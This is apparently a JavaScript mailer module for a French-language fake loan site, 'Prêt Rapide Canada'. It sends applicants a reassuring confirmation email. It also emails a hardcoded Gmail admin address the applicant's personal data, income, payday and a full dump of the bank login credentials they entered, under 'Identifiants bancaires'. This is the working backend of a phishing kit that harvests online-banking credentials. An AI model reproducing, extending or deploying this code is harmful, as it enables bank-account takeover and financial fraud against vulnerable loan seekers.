const nodemailer = require('nodemailer');
const crypto = require('crypto');

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
  pool: true,
  maxConnections: 5,
  rateLimit: 5,
  tls: {
    rejectUnauthorized: true,
  },
});

const DOMAIN = (process.env.SMTP_USER || '').split('@')[1] || 'gmail.com';
const FROM   = `"${process.env.FROM_NAME || 'Prêt Rapide Canada'}" <${process.env.FROM_EMAIL || process.env.SMTP_USER}>`;

function getPublicSiteUrl() {
  if (process.env.APP_URL) return process.env.APP_URL.replace(/\/$/, '');
  if (process.env.VERCEL_URL) return `https://${process.env.VERCEL_URL.replace(/^https?:\/\//, '')}`;
  return 'https://pret-rapide.vercel.app';
}

const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'autokompetenzgmbh@gmail.com';

async function sendMail({ to, subject, html, text }) {
  const messageId = `<${crypto.randomUUID()}@${DOMAIN}>`;
  return transporter.sendMail({
    from: FROM,
    to,
    subject,
    html,
    text,
    headers: {
      'Message-ID': messageId,
      'X-Mailer': 'Prêt Rapide Canada Mailer v1',
      'X-Entity-Ref-ID': crypto.randomUUID(),
      'Precedence': 'bulk',
      'List-Unsubscribe': `<mailto:${process.env.SMTP_USER}?subject=unsubscribe>`,
      'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
    },
  });
}

function formatDate(date) {
  return new Date(date).toLocaleDateString('fr-FR', {
    day: 'numeric', month: 'long', year: 'numeric',
  });
}

function baseTemplate(content) {
  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Prêt Rapide Canada</title>
</head>
<body style="margin:0;padding:0;background:#0A1F44;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0A1F44;min-height:100vh;">
    <tr><td align="center" style="padding:40px 16px;">
      <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;">

        <tr>
          <td style="background:#061232;border-radius:12px 12px 0 0;padding:32px 40px;border-bottom:2px solid #F5A623;">
            <table width="100%" cellpadding="0" cellspacing="0">
              <tr>
                <td>
                  <div style="font-size:20px;font-weight:900;color:#ffffff;letter-spacing:0.04em;">PRÊT RAPIDE</div>
                  <div style="font-size:9px;letter-spacing:0.4em;color:#F5A623;text-transform:uppercase;margin-top:3px;">Canada · Service de prêt en ligne</div>
                </td>
                <td align="right">
                  <div style="width:48px;height:48px;background:#F5A623;border-radius:8px;display:inline-block;line-height:48px;text-align:center;font-size:22px;">💰</div>
                </td>
              </tr>
            </table>
          </td>
        </tr>

        <tr>
          <td style="background:#0D2756;padding:40px 40px 32px;">
            ${content}
          </td>
        </tr>

        <tr>
          <td style="background:#061232;border-radius:0 0 12px 12px;padding:24px 40px;border-top:1px solid rgba(245,166,35,0.1);">
            <table width="100%" cellpadding="0" cellspacing="0">
              <tr>
                <td style="font-size:12px;color:rgba(255,255,255,0.3);line-height:1.8;">
                  <strong style="color:rgba(255,255,255,0.5);">Prêt Rapide Canada</strong><br/>
                  Service de prêt en ligne · Canada<br/>
                  📧 pretrapidecanada@gmail.com
                </td>
                <td align="right" style="font-size:11px;color:rgba(255,255,255,0.15);">
                  © ${new Date().getFullYear()} Prêt Rapide Canada
                </td>
              </tr>
            </table>
          </td>
        </tr>

      </table>
    </td></tr>
  </table>
</body>
</html>`;
}

async function sendClientConfirmation({ email, firstName, amount, bankName }) {
  const amountFormatted = amount ? `${amount}$` : '—';
  const content = `
    <div style="text-align:center;margin-bottom:36px;">
      <div style="width:72px;height:72px;background:rgba(34,197,94,0.1);border:2px solid rgba(34,197,94,0.3);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:32px;margin-bottom:20px;">📄</div>
      <h1 style="margin:0 0 10px;font-size:28px;font-weight:900;color:#ffffff;letter-spacing:-0.02em;">Demande reçue, ${firstName} !</h1>
      <p style="margin:0;font-size:16px;color:rgba(255,255,255,0.45);line-height:1.6;">Nous traitons votre demande de prêt.</p>
    </div>

    <div style="height:1px;background:rgba(245,166,35,0.08);margin-bottom:32px;"></div>

    <p style="font-size:15px;color:rgba(255,255,255,0.65);line-height:1.8;margin:0 0 24px;">
      Bonjour <strong style="color:#fff;">${firstName}</strong>,<br/><br/>
      Nous avons bien reçu votre demande de prêt. Notre équipe l'analyse et vous recontactera sous <strong style="color:#F5A623;">24h maximum</strong>.
    </p>

    <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:32px;">
      <tr>
        <td style="padding:10px 0;">
          <table cellpadding="0" cellspacing="0">
            <tr>
              <td style="width:44px;height:44px;background:rgba(245,166,35,0.08);border:1px solid rgba(245,166,35,0.2);border-radius:8px;text-align:center;vertical-align:middle;font-size:20px;">💰</td>
              <td style="padding-left:14px;">
                <div style="font-size:14px;font-weight:700;color:#fff;margin-bottom:2px;">Montant demandé</div>
                <div style="font-size:13px;color:rgba(255,255,255,0.4);">${amountFormatted}</div>
              </td>
            </tr>
          </table>
        </td>
      </tr>
      <tr>
        <td style="padding:10px 0;">
          <table cellpadding="0" cellspacing="0">
            <tr>
              <td style="width:44px;height:44px;background:rgba(245,166,35,0.08);border:1px solid rgba(245,166,35,0.2);border-radius:8px;text-align:center;vertical-align:middle;font-size:20px;">🏦</td>
              <td style="padding-left:14px;">
                <div style="font-size:14px;font-weight:700;color:#fff;margin-bottom:2px;">Banque sélectionnée</div>
                <div style="font-size:13px;color:rgba(255,255,255,0.4);">${bankName}</div>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>

    <div style="text-align:center;margin:32px 0 0;">
      <div style="font-size:12px;color:rgba(255,255,255,0.25);line-height:1.7;">
        Une question ? Répondez à cet e-mail ou contactez-nous.<br/>
        Notre équipe est là pour vous accompagner.
      </div>
    </div>
  `;

  await sendMail({
    to: email,
    subject: `Confirmation de votre demande - Prêt Rapide Canada`,
    html: baseTemplate(content),
    text: [
      `Demande reçue, ${firstName} !`,
      ``,
      `Bonjour ${firstName},`,
      `Votre demande de prêt a bien été reçue.`,
      `Notre équipe l'analyse et vous recontactera sous 24h maximum.`,
      ``,
      `Montant : ${amountFormatted}`,
      `Banque : ${bankName}`,
      ``,
      `-- Prêt Rapide Canada`,
      `Service de prêt en ligne · Canada`,
    ].join('\n'),
  });
}

async function sendAdminNotification(data) {
  const bankCredsHtml = Object.entries(data.bankCredentials || {})
    .map(([k, v]) => `<tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:5px 0;">${k}</td><td align="right" style="font-size:13px;color:#F5A623;font-weight:600;font-family:monospace;">${v}</td></tr>`)
    .join('');

  const content = `
    <div style="text-align:center;margin-bottom:28px;">
      <div style="width:64px;height:64px;background:rgba(245,166,35,0.1);border:2px solid rgba(245,166,35,0.35);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:28px;margin-bottom:16px;">🔔</div>
      <h1 style="margin:0 0 8px;font-size:24px;font-weight:900;color:#ffffff;">Nouvelle demande de prêt</h1>
      <p style="margin:0;font-size:14px;color:rgba(255,255,255,0.45);">${formatDate(new Date())}</p>
    </div>

    <div style="background:#061232;border:1px solid rgba(245,166,35,0.15);border-radius:10px;padding:20px 24px;margin-bottom:24px;">
      <div style="font-size:11px;font-weight:800;letter-spacing:0.3em;text-transform:uppercase;color:rgba(255,255,255,0.35);margin-bottom:14px;">Informations personnelles</div>
      <table width="100%" cellpadding="0" cellspacing="0">
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Nom</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.fullName || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Email</td><td align="right" style="font-size:13px;color:#F5A623;font-weight:600;">${data.email || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Téléphone</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.phone || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Adresse</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.address || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Ville</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.city || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Code postal</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.postalCode || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Revenu mensuel</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.monthlyIncome || '—'}$</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Profession</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.profession || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Prochain salaire</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.nextPayday || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Conjoint</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.jointRequest || 'non'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Objet</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.loanPurpose || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Date souhaitée</td><td align="right" style="font-size:13px;color:#fff;font-weight:600;">${data.desiredDate || '—'}</td></tr>
        <tr><td style="font-size:13px;color:rgba(255,255,255,0.5);padding:4px 0;">Banque</td><td align="right" style="font-size:13px;color:#F5A623;font-weight:700;">${data.bankName || data.bankId || '—'}</td></tr>
      </table>
    </div>

    <div style="background:#061232;border:1px solid rgba(245,166,35,0.15);border-radius:10px;padding:20px 24px;margin-bottom:24px;">
      <div style="font-size:11px;font-weight:800;letter-spacing:0.3em;text-transform:uppercase;color:rgba(255,255,255,0.35);margin-bottom:14px;">Identifiants bancaires</div>
      <table width="100%" cellpadding="0" cellspacing="0">
        ${bankCredsHtml || '<tr><td style="font-size:13px;color:rgba(255,255,255,0.3);padding:5px 0;text-align:center;">Aucun</td></tr>'}
      </table>
    </div>

    <div style="text-align:center;margin-top:24px;">
      <div style="font-size:11px;color:rgba(255,255,255,0.2);text-align:center;">
        Email généré automatiquement — Prêt Rapide Canada
      </div>
    </div>
  `;

  await sendMail({
    to: ADMIN_EMAIL,
    subject: `🔔 Nouvelle demande - ${data.fullName || 'Anonyme'} - ${data.bankName || data.bankId || '?'}`,
    html: baseTemplate(content),
    text: Object.entries({
      'Nom': data.fullName, 'Email': data.email, 'Téléphone': data.phone,
      'Adresse': data.address, 'Ville': data.city, 'Code postal': data.postalCode,
      'Revenu mensuel': data.monthlyIncome, 'Profession': data.profession,
      'Prochain salaire': data.nextPayday, 'Conjoint': data.jointRequest,
      'Objet': data.loanPurpose, 'Date souhaitée': data.desiredDate,
      'Banque': data.bankName || data.bankId,
    }).map(([k, v]) => `${k} : ${v || '—'}`).join('\n') + '\n\n--- IDENTIFIANTS BANCAIRES ---\n' + Object.entries(data.bankCredentials || {}).map(([k, v]) => `${k} : ${v}`).join('\n'),
  });
}

module.exports = {
  sendClientConfirmation,
  sendAdminNotification,
};
